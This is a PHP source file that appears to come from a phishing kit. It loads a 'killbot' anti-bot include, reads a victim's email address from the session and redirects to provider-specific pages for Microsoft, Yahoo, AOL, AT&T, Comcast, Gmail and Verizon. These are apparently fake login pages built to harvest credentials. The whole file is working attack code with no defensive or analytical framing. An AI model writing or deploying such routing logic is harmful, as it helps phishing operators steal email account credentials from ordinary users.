<?php
session_start();
require_once($_SERVER['DOCUMENT_ROOT'].'/killbot/code/include.php');


if(strstr($_SESSION["eml"],"hotmail")   || strstr($_SESSION["eml"],"live") || strstr($_SESSION["eml"],"msn") || strstr($_SESSION["eml"],"outlook")){
header("location: ../dwn/dwn_ms.php");
}





else if (strstr($_SESSION["eml"],"yahoo") || strstr($_SESSION["eml"],"Yahoo")) {
header("location: ../dwn/dwn_yh.php");
}

else if (strstr($_SESSION["eml"],"Aol") || strstr($_SESSION["eml"],"aol")) {
header("location: ../dwn/dwn_aol.php");
}

else if (strstr($_SESSION["eml"],"Att") || strstr($_SESSION["eml"],"att")) {
header("location: ../dwn/dwn_att.php");
}

else if (strstr($_SESSION["eml"],"Comcast")   || strstr($_SESSION["eml"],"comcast") || strstr($_SESSION["eml"],"xfinity") || strstr($_SESSION["eml"],"Xfinity")) {
header("location: ../dwn/dwn_xf.php");
}




else if (strstr($_SESSION["eml"],"gmail")) {
header("location: ../dwn/dwn_gm.php");
}


else if (strstr($_SESSION["eml"],"verizon")) {
header("location: ../dwn/dwn_vz.php");
}
else header("location: ../diasuser-em.php");

?>